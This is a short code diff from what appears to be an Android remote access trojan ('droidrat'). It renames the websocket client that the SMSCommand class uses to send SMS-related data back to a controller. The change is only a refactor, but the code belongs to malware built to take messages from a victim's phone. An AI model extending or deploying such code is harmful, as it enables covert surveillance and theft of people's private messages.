@@ -9,7 +9,7 @@ import com.je_chen.droidrat_je.rat.modules.appintent.sms.SMS;
 
 import java.util.List;
 
-import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;
+import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;
 
 public class SMSCommand extends CommandFather {
 
@@ -24,7 +24,7 @@ public class SMSCommand extends CommandFather {
 
     @Override
     public void send(String value) {
-        websockets.send(value);
+        droidRatWebSocketClient.send(value);
     }
 
     @Override
